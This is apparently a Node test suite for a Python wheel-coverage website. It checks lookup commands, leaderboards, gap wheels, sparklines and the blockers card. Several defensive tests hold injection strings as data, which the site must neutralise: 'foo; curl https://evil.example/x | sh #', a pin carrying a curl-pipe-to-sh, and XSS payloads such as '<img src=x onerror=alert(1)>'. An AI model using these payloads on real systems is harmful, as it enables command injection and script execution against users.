// Extended offline verification for site/app.js & new enterprise features
"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const SITE = path.join(__dirname, "..", "..", "site");

test("app.js and logic.js execute together without syntax or declaration errors", () => {
  const logicSrc = fs.readFileSync(path.join(SITE, "logic.js"), "utf8");
  const appSrc = fs.readFileSync(path.join(SITE, "app.js"), "utf8");

  // Mock a minimal DOM context
  const mockDOM = {
    document: {
      getElementById: (id) => ({
        textContent: "",
        innerHTML: "",
        hidden: false,
        value: "",
        addEventListener: () => {},
        classList: { add: () => {}, remove: () => {}, toggle: () => {} },
        setAttribute: () => {},
        removeAttribute: () => {},
        style: {},
        querySelector: () => null,
        querySelectorAll: () => [],
      }),
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener: () => {},
      documentElement: {
        getAttribute: () => "light",
        setAttribute: () => {},
      },
      body: {
        style: {},
        appendChild: () => {},
        removeChild: () => {},
      },
      createElement: (tag) => ({
        tagName: tag,
        href: "",
        textContent: "",
        download: "",
        click: () => {},
      }),
    },
    location: { hash: "" },
    history: { replaceState: () => {} },
    localStorage: {
      getItem: () => null,
      setItem: () => {},
    },
    window: {
      matchMedia: () => ({ matches: false }),
    },
    fetch: () => Promise.resolve({ ok: true, json: () => Promise.resolve({}) }),
    console,
    Date,
    Math,
    Number,
    String,
    Array,
    Object,
    Set,
    Map,
    Promise,
    URLSearchParams,
    encodeURIComponent,
    decodeURIComponent,
  };

  const context = vm.createContext(mockDOM);
  assert.doesNotThrow(() => {
    vm.runInContext(logicSrc, context);
    vm.runInContext(appSrc, context);
  });
});

test("Omni-checker and Leaderboard logic with actual dataset", () => {
  const coverageData = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "..", "data", "coverage.json"), "utf8"));
  const logicSrc = fs.readFileSync(path.join(SITE, "logic.js"), "utf8");
  const appSrc = fs.readFileSync(path.join(SITE, "app.js"), "utf8");

  const elements = {};
  const getEl = (id) => {
    if (!elements[id]) {
      elements[id] = {
        id,
        textContent: "",
        innerHTML: "",
        hidden: false,
        value: "",
        addEventListener: () => {},
        classList: { add: () => {}, remove: () => {}, toggle: () => {} },
        setAttribute: () => {},
        removeAttribute: () => {},
        style: {},
        querySelector: () => null,
        querySelectorAll: () => [],
      };
    }
    return elements[id];
  };

  const mockDOM = {
    document: {
      getElementById: getEl,
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener: () => {},
      documentElement: {
        getAttribute: () => "light",
        setAttribute: () => {},
      },
      body: {
        style: {},
        appendChild: () => {},
        removeChild: () => {},
      },
      createElement: (tag) => ({
        tagName: tag,
        href: "",
        textContent: "",
        download: "",
        click: () => {},
      }),
    },
    location: { hash: "#package=numpy&python=3.13&platform=musl-aarch64" },
    history: { replaceState: () => {} },
    localStorage: { getItem: () => null, setItem: () => {} },
    window: { matchMedia: () => ({ matches: false }) },
    fetch: (url) => {
      if (url === "data/coverage.json") return Promise.resolve({ ok: true, json: () => Promise.resolve(coverageData) });
      return Promise.resolve({ ok: true, json: () => Promise.resolve([]) });
    },
    console,
    Date,
    Math,
    Number,
    String,
    Array,
    Object,
    Set,
    Map,
    Promise,
    URLSearchParams,
    encodeURIComponent,
    decodeURIComponent,
  };

  mockDOM.coverageData = coverageData;
  const context = vm.createContext(mockDOM);
  vm.runInContext(logicSrc, context);
  vm.runInContext(appSrc, context);

  // Set state
  vm.runInContext("state.data = coverageData; state.python = '3.13'; state.platform = 'musl-aarch64';", context);
  getEl("search").value = "numpy";
  getEl("omni-python-select").value = "3.13";
  getEl("omni-platform-select").value = "musl-aarch64";

  // Test Omni-Checker instant answer
  vm.runInContext("renderOmniAnswer()", context);
  const answerHtml = getEl("omni-answer").innerHTML;
  assert.ok(answerHtml.includes("verdict-wheel"), "numpy should have a prebuilt wheel verdict");
  assert.ok(answerHtml.includes("numpy"), "answer includes package name");
  assert.ok(answerHtml.includes("Alpine ARM64"), "answer includes platform name");
  assert.ok(answerHtml.includes("3.13"), "answer includes python version");

  // Test Minimized Summary bar
  const miniHtml = getEl("omni-minimized-summary").innerHTML;
  assert.ok(miniHtml.includes("badge-wheel"), "minimized summary includes wheel badge");
  assert.ok(miniHtml.includes(`Inspect ${coverageData.targets.length}`), "minimized summary includes the Inspect button, with the real target count");
  assert.ok(miniHtml.includes("Filter Gaps"), "minimized summary includes Filter Gaps button");

  // Test Leaderboard sorting: worst served first
  vm.runInContext("renderLeaderboard()", context);
  const boardHtml = getEl("platform-leaderboard").innerHTML;
  assert.ok(boardHtml.includes("Worst Served"), "leaderboard highlights worst served platforms");
  assert.ok(boardHtml.includes("leaderboard-card"), "leaderboard renders platform cards");

  // Test Gaps Table
  vm.runInContext("renderGaps()", context);
  const gapsHtml = getEl("gaps").innerHTML;
  assert.ok(gapsHtml.includes("<tr"), "gaps table has rows for Alpine ARM64");
  assert.ok(getEl("pagination-info-top").textContent.includes("Showing 1–25"), "pagination info shows page 1-25");
});


// ---------------------------------------------------------------------------------------------------------------
// The whole page under node: logic.js + app.js with a stub DOM that records event handlers, fed the repository's
// data/ files. Used to check what clicks and shared links re-render.
// ---------------------------------------------------------------------------------------------------------------
const ROOT = path.join(__dirname, "..", "..");

function element() {
  const handlers = {};
  return {
    innerHTML: "", textContent: "", value: "", hidden: false, href: "", dataset: {}, style: {}, handlers,
    addEventListener(type, fn) { handlers[type] = fn; },
    classList: { add() {}, remove() {}, toggle() {} },
    setAttribute() {}, removeAttribute() {}, getAttribute() { return null; },
    querySelector() { return null; }, querySelectorAll() { return []; },
    scrollIntoView() {}, append() {}, focus() {},
  };
}

async function loadPage(hash, packageData = null, gapWheelIndex = null) {
  const elements = new Map();
  const location = { hash };
  const get = (id) => {
    if (!elements.has(id)) elements.set(id, element());
    return elements.get(id);
  };
  const context = {
    console, URLSearchParams, setTimeout, location,
    history: { replaceState(_state, _title, url) { location.hash = url; } },
    navigator: {},
    localStorage: { getItem() { return null; }, setItem() {} },
    window: { matchMedia: () => ({ matches: false }), innerWidth: 1280 },
    document: {
      getElementById: get,
      querySelector() { return null; }, querySelectorAll() { return []; },
      addEventListener() {},
      documentElement: { getAttribute() { return "light"; }, setAttribute() {} },
      body: { style: {}, appendChild() {}, removeChild() {} },
      createElement: element,
    },
    fetch: async (url) => {
      if (url === "../wheels/data/gap-wheels.json") {
        if (typeof gapWheelIndex === "function") return gapWheelIndex(); // a test's own failing response
        return { ok: gapWheelIndex !== null, json: async () => gapWheelIndex };
      }
      if (url.startsWith("data/packages/") && url.endsWith(".json"))
        return { ok: packageData !== null, json: async () => packageData };
      const file = path.join(ROOT, url);
      if (!/^data\/[a-z]+\.json$/.test(url) || !fs.existsSync(file)) return { ok: false, json: async () => null };
      const json = JSON.parse(fs.readFileSync(file, "utf8"));
      return { ok: true, json: async () => json };
    },
  };
  vm.createContext(context);
  const code = ["logic.js", "app.js"].map((f) => fs.readFileSync(path.join(ROOT, "site", f), "utf8")).join("\n;\n");
  vm.runInContext(code, context, { filename: "site/logic.js + site/app.js" });
  for (let i = 0; i < 50; i++) {
    if (get("platform-leaderboard").innerHTML) break;
    await new Promise((r) => setImmediate(r));
  }
  assert.doesNotMatch(get("meta").textContent, /Couldn't load/, "the page loaded its data");
  assert.ok(get("platform-leaderboard").innerHTML, "the platform cards rendered");
  return { get, context };
}

const coverage = () => JSON.parse(fs.readFileSync(path.join(ROOT, "data", "coverage.json"), "utf8"));
const cardClick = (platform) => ({ target: { closest: (sel) => (sel === ".leaderboard-card" ? { dataset: { pl: platform } } : null) } });

test("clicking a platform card updates the lookup's \"Why?\" command (#56)", async () => {
  const data = coverage();
  const python = data.targets[0].python;
  const name = data.packages[0].name;
  const page = await loadPage(`#python=${python}&platform=musl-aarch64&package=${name}`);
  const lookup = page.get("lookup");
  assert.match(lookup.innerHTML, / -t musl-aarch64 --explain/);

  page.get("platform-leaderboard").handlers.click(cardClick("win-arm64"));
  assert.match(lookup.innerHTML, / -t win-arm64 --explain/);
  assert.doesNotMatch(lookup.innerHTML, /musl-aarch64 --explain/);
});

test("a name from a shared link never reaches a copy-paste command unless it's a valid package name (#57)", async () => {
  const evil = "foo; curl https://evil.example/x | sh #";
  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
  for (const id of ["lookup", "omni-answer", "omni-minimized-summary"]) {
    const html = page.get(id).innerHTML;
    assert.doesNotMatch(html, /uvx wheelgap/, id);
    assert.doesNotMatch(html, /evil\.example/, id);
  }
  assert.match(page.get("lookup").innerHTML, /isn't a valid package name/);
});

test("a valid name outside the top gets the command; a pinned one finds its package (#57)", async () => {
  const outside = await loadPage("#package=surely-not-a-top-package-xyz");
  assert.match(outside.get("lookup").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -t all/);
  assert.match(outside.get("omni-answer").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -p /);

  const top = coverage().packages[0];
  const pinned = await loadPage(`#package=${top.name}==0.0.1`);
  const html = pinned.get("lookup").innerHTML;
  assert.match(html, new RegExp(`The scan checks the latest release, ${top.version.replace(/[.+]/g, "\\$&")}, not 0\\.0\\.1`));
  assert.doesNotMatch(html, /isn't in the top/);
});

test("pure Python packages are described as shipping a pure Python wheel, not as installing everywhere", async () => {
  const page = await loadPage("");
  for (const id of ["pure-note", "kpi-pure-pct"]) assert.doesNotMatch(page.get(id).textContent, /everywhere|anywhere/, id);
  assert.match(page.get("pure-note").textContent, /ship a pure Python wheel/);
});

test("the instant checker says when a pinned version isn't the release the scan checked", async () => {
  const top = coverage().packages[0];
  const page = await loadPage(`#package=${top.name}==0.0.1`);
  page.get("search").value = `${top.name}==0.0.1`;
  vm.runInContext("renderOmniAnswer()", page.context);
  const html = page.get("omni-answer").innerHTML;
  assert.match(html, /The scan checks the latest release/);
  assert.match(html, new RegExp(`uvx wheelgap ${top.name}==0\\.0\\.1 -p `));
});

test("a package whose lookup failed isn't described as building from source in its expanded row", async () => {
  const data = coverage();
  const python = data.targets[0].python;
  const at = data.targets.findIndex((t) => t.python === python && t.platform === "musl-aarch64");
  const errored = data.packages.find((p) => p.results[at] === "unknown");
  if (!errored) return; // nothing to check in this snapshot
  const page = await loadPage(`#python=${python}&platform=musl-aarch64`);
  vm.runInContext(`state.expandedPkg = ${JSON.stringify(errored.name)}; state.pageSize = "all"; renderGaps();`, page.context);
  const html = page.get("gaps").innerHTML;
  const row = html.slice(html.indexOf("gap-inline-row"));
  assert.match(row, /unknown/);
  assert.doesNotMatch(row.slice(0, row.indexOf("</tr>")), /builds from source/);
});

test("an invalid pin never reaches the checker's command (#57)", async () => {
  const top = coverage().packages[0];
  const evil = `${top.name}==1.0;curl https://evil.example/x|sh`;
  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
  page.get("search").value = evil;
  vm.runInContext("renderOmniAnswer()", page.context);
  for (const id of ["omni-answer", "omni-minimized-summary", "lookup"]) {
    assert.doesNotMatch(page.get(id).innerHTML, /evil\.example/, id);
  }
});

test("lookup offers a verified same-release gap wheel without changing the PyPI status (#129)", async () => {
  const data = coverage();
  const pkg = data.packages.find((p) => p.results.some((v) => v === "source" || v === "missing"));
  assert.ok(pkg);
  const index = pkg.results.findIndex((v) => v === "source" || v === "missing");
  const doc = { schema: 1, wheels: [{
    name: pkg.name, version: pkg.version, target: data.targets[index].label,
    wheel: "trusted-1.0-cp314.whl", sha256: "a".repeat(64),
  }] };
  const page = await loadPage(`#package=${pkg.name}`, null, doc);
  await new Promise((resolve) => setImmediate(resolve));
  const html = page.get("lookup").innerHTML;
  const re = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  assert.match(html, /<h4>Gap wheels<\/h4>/);
  assert.match(html, new RegExp(`unofficial wheel of ${re(pkg.name)} ${re(pkg.version)} for ${re(data.targets[index].label)},`));
  assert.match(html, /built from the PyPI sdist\. It isn't from the package's maintainers\./);
  const canonical = pkg.name.toLowerCase().replace(/[-_.]+/g, "-");
  assert.match(html, new RegExp(`pip install --extra-index-url https://wheelgap\\.github\\.io/wheels/simple/ ${re(canonical)}==${re(pkg.version)}<`));
  assert.match(html, /About the gap wheels/);
  assert.match(html, /<small class="bver" style="[^"]*color:var\(--text-muted\)[^"]*">Unofficial gap wheel available below<\/small>/);
  assert.match(html, /from source|can&#39;t install/);

  const wrong = await loadPage(`#package=${pkg.name}==0.0.1`, null, doc);
  await new Promise((resolve) => setImmediate(resolve));
  assert.doesNotMatch(wrong.get("lookup").innerHTML, /Gap wheels|gap wheel available/);
});

test("missing or unreadable gap-wheel data never prevents the normal lookup (#129)", async () => {
  const pkg = coverage().packages.find((p) => p.results.includes("source"));
  const failures = {
    "an unusable document": { schema: 0, wheels: [] },
    "a body that isn't JSON": () => ({ ok: true, json: async () => { throw new SyntaxError("bad JSON"); } }),
    "a failed request": async () => { throw new TypeError("network down"); },
  };
  for (const [what, response] of Object.entries(failures)) {
    const page = await loadPage(`#package=${pkg.name}`, null, response);
    await new Promise((resolve) => setImmediate(resolve));
    const html = page.get("lookup").innerHTML;
    assert.match(html, /Package page/, what);
    assert.doesNotMatch(html, /Gap wheels|gap wheel available/, what);
  }
});

// A scanned package with a `source` cell, and a package document giving that target blockers and an `older`
// way out (the only kind the scan writes), plus a not_checked target.
function wholeTreeCase() {
  const data = coverage();
  const pkg = data.packages.find((p) => !p.error && p.results.includes("source"));
  const gap = data.targets[pkg.results.indexOf("source")].label;
  const unchecked = data.targets.find((t) => t.label !== gap).label;
  const details = { schema: 1, name: pkg.name.toLowerCase().replace(/[-_.]+/g, "-"), version: pkg.version,
    install: { [gap]: { status: "source", blockers: [{
      name: "<dependency>", version: "1&2", status: "source", via: [pkg.name, "Middle&", "<dependency>"],
    }] }, [unchecked]: { status: "not_checked", blockers: [] } },
    way_out: { [gap]: { kind: "older", release: "0.1" } } };
  return { pkg, gap, unchecked, details };
}
const reEscape = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

test("home lookup shows whole-tree blockers, safe via paths, and release hints (#92)", async () => {
  const { pkg, gap, unchecked, details } = wholeTreeCase();
  const page = await loadPage(`#package=${pkg.name}`, details);
  await new Promise((resolve) => setImmediate(resolve));
  const html = page.get("lookup").innerHTML;
  assert.match(html, /Install coverage with dependencies/);
  assert.match(html, new RegExp(`<th scope="row">${reEscape(gap)}</th><td><span class="status s-source">Builds from source</span>`));
  assert.match(html, /builds from source/);
  assert.match(html, /&lt;dependency&gt;==1&amp;2/);
  assert.match(html, /Middle&amp;/);
  assert.doesNotMatch(html, /<dependency>/);
  assert.match(html, new RegExp(`<th scope="row">${reEscape(unchecked)}</th><td><span class="status s-unknown">Not checked</span>`));
  assert.match(html, /<small class="bver" style="[^"]*color:var\(--text-muted\)[^"]*">0\.1 is the last release with a wheel here\.<\/small>/);
});

test("a pinned lookup shows neither whole-tree results nor way-out hints (#92)", async () => {
  const { pkg, details } = wholeTreeCase();
  const page = await loadPage(`#package=${pkg.name}==0.0.0`, details);
  await new Promise((resolve) => setImmediate(resolve));
  const html = page.get("lookup").innerHTML;
  assert.match(html, /not 0\.0\.0/);
  assert.doesNotMatch(html, /Install coverage with dependencies/);
  assert.doesNotMatch(html, /is the last release with a wheel here/);
});

test("sparkline labels the latest point and marks version upgrade points (#78)", async () => {
  const page = await loadPage("");
  const points = [
    { date: "2026-11-09", value: 80.0, upgrade: "" },
    { date: "2026-11-10", value: 82.5, upgrade: "0.7.0" },
    { date: "2026-11-11", value: 85.0, upgrade: "" },
  ];
  const svg = vm.runInContext(`sparkline(${JSON.stringify(points)}, "Windows on ARM")`, page.context);
  assert.match(svg, /class="spark-label"[^>]*>85\.0%/);
  assert.match(svg, /class="[^"]*spark-upgrade[^"]*"/);
  assert.match(svg, /spark-upgrade-line/);
  assert.match(svg, /wheelgap changed to 0\.7\.0/);
  assert.match(svg, /latest/);
  assert.equal((svg.match(/<circle class=/g) || []).length, 1, "only the marked point gets a class");
});

test("sparkline marks the night Pyodide's own builds start counting, and escapes what it marks (#78)", async () => {
  const page = await loadPage("");
  const points = [
    { date: "2026-11-09", value: 80.0, upgrade: "", bundledStart: false },
    { date: "2026-11-10", value: 82.0, upgrade: "<b>x</b>", bundledStart: true },
  ];
  const svg = vm.runInContext(`sparkline(${JSON.stringify(points)}, "Pyodide")`, page.context);
  assert.match(svg, /Pyodide&#39;s own builds counted from here/);
  assert.match(svg, /wheelgap changed to &lt;b&gt;x&lt;\/b&gt;/);
  assert.doesNotMatch(svg, /<b>/);
});

test("renderTrends updates trend-note with latest point and upgrade mentions (#78)", async () => {
  const page = await loadPage("");
  const history = [
    {
      date: "2026-11-09",
      wheelgap: "0.6.3",
      packages: 5000,
      summary: { "3.13 win-arm64": { wheel: 4000 } },
    },
    {
      date: "2026-11-10",
      wheelgap: "0.7.0",
      packages: 5000,
      summary: { "3.13 win-arm64": { wheel: 4200 } },
    },
  ];
  vm.runInContext(`state.history = ${JSON.stringify(history)}; state.python = "3.13"; state.showCompiledOnly = false; renderTrends();`, page.context);
  const note = page.get("trend-note").textContent;
  assert.match(note, /with the latest point labelled/);
  assert.match(note, /Marked points aren't like for like/);
});

test("the trend note says the Pyodide sparkline counts Pyodide's own builds, like the percentages (#78)", async () => {
  const page = await loadPage("");
  const history = [
    { date: "2026-11-09", wheelgap: "0.9.0", packages: 5000, summary: { "3.13 win-arm64": { wheel: 4000 } } },
    { date: "2026-11-10", wheelgap: "0.9.0", packages: 5000, summary: { "3.13 win-arm64": { wheel: 4010 } } },
  ];
  vm.runInContext(
    `state.history = ${JSON.stringify(history)}; state.python = "3.13"; state.showCompiledOnly = false;
     state.data.summary = Object.assign({}, state.data.summary, { "3.13 pyodide": { wheel: 4068, bundled: 82 } });
     renderTrends();`,
    page.context,
  );
  const note = page.get("trend-note").textContent;
  assert.match(note, /On Pyodide they also count Pyodide's own builds/);
  assert.doesNotMatch(note, /PyPI wheels only/);
  assert.doesNotMatch(note, /Marked points/);
});

test("renderBlockers displays top install blockers with counts, examples, and links (#93)", async () => {
  const page = await loadPage("");
  const blockersData = {
    generated: "2026-11-17T00:00:00+00:00",
    targets: {
      "3.14 win-arm64": {
        checked: 412,
        blockers: [
          { name: "cryptography", count: 41, examples: ["pyjwt", "urllib3", "requests"] },
          { name: "cffi", count: 12, examples: ["cryptography"] },
        ],
      },
    },
  };
  vm.runInContext(`state.blockers = ${JSON.stringify(blockersData)}; state.python = "3.14"; state.platform = "win-arm64"; renderBlockers();`, page.context);
  const note = page.get("blockers-note").textContent;
  assert.match(note, /other top-500 packages installing from wheels alone on 3\.14 win-arm64, of 412 checked\./);
  assert.equal(page.get("blockers-target-badge").textContent, "3.14 win-arm64");
  const html = page.get("blockers-feed").innerHTML;
  assert.match(html, /Blocks 41 other top-500 installs, e\.g\. <a href="p\/pyjwt\/"/);
  assert.match(html, /Blocks 12 other top-500 installs, e\.g\./);
  assert.match(html, /href="p\/cryptography\/" class="pulse-pkg"/);
  assert.doesNotMatch(html, /data-pkg/, "the name goes to the package page, not the drawer");
});

const blockersDoc = {
  generated: "2026-11-17T00:00:00+00:00",
  targets: {
    "3.14 win-arm64": { checked: 498, blockers: [{ name: "cryptography", count: 29, examples: ["google-auth"] }] },
    "3.14 musl-aarch64": { checked: 498, blockers: [{ name: "google-crc32c", count: 4, examples: ["google-cloud-storage"] }] },
    "3.14 linux-x86_64": { checked: 498, blockers: [] },
  },
};

test("the blockers card falls back to the newest Python checked, and says so (#93)", async () => {
  const page = await loadPage("");
  vm.runInContext(`state.blockers = ${JSON.stringify(blockersDoc)}; state.python = "3.13"; state.platform = "win-arm64"; renderBlockers();`, page.context);
  assert.equal(page.get("blockers-target-badge").textContent, "3.14 win-arm64");
  assert.match(page.get("blockers-note").textContent, /Installs aren't checked for Python 3\.13 here, so this is Python 3\.14\./);
  assert.match(page.get("blockers-feed").innerHTML, /cryptography/);

  vm.runInContext(`state.platform = "linux-x86_64"; renderBlockers();`, page.context);
  assert.match(page.get("blockers-feed").innerHTML, /No missing wheel here holds back another top-500 package/);

  vm.runInContext(`state.platform = "macos-arm64"; renderBlockers();`, page.context);
  assert.match(page.get("blockers-note").textContent, /Whole-tree installs aren't checked on macos-arm64/);
  assert.equal(page.get("blockers-feed").innerHTML, "");
  assert.doesNotMatch(page.get("blockers-note").textContent, /No install blockers/);

  vm.runInContext(`state.blockers = null; renderBlockers();`, page.context);
  assert.match(page.get("blockers-note").textContent, /isn't available right now/);
});

test("changing the platform re-renders the blockers card (#93)", async () => {
  const page = await loadPage("");
  vm.runInContext(`state.blockers = ${JSON.stringify(blockersDoc)}; state.python = "3.14"; state.platform = "win-arm64"; renderBlockers();`, page.context);
  assert.match(page.get("blockers-feed").innerHTML, /cryptography/);

  page.get("platform-leaderboard").handlers.click(cardClick("musl-aarch64"));
  assert.match(page.get("blockers-feed").innerHTML, /google-crc32c/);
  assert.doesNotMatch(page.get("blockers-feed").innerHTML, /cryptography/);

  page.get("omni-platform-select").handlers.change({ target: { value: "win-arm64" } });
  assert.match(page.get("blockers-feed").innerHTML, /cryptography/);
});

test("the blockers card never renders a hostile name from blockers.json (#93)", async () => {
  const page = await loadPage("");
  const doc = { targets: { "3.14 win-arm64": { checked: 10, blockers: [
    { name: "<img src=x onerror=alert(1)>", count: 3, examples: [] },
    { name: "ok-pkg", count: 2, examples: ["\"><script>", "fine"] },
  ] } } };
  vm.runInContext(`state.blockers = ${JSON.stringify(doc)}; state.python = "3.14"; state.platform = "win-arm64"; renderBlockers();`, page.context);
  const html = page.get("blockers-feed").innerHTML;
  assert.doesNotMatch(html, /<img|<script|onerror/);
  assert.match(html, /ok-pkg/);
  assert.match(html, /e\.g\. <a href="p\/fine\/"/);
});
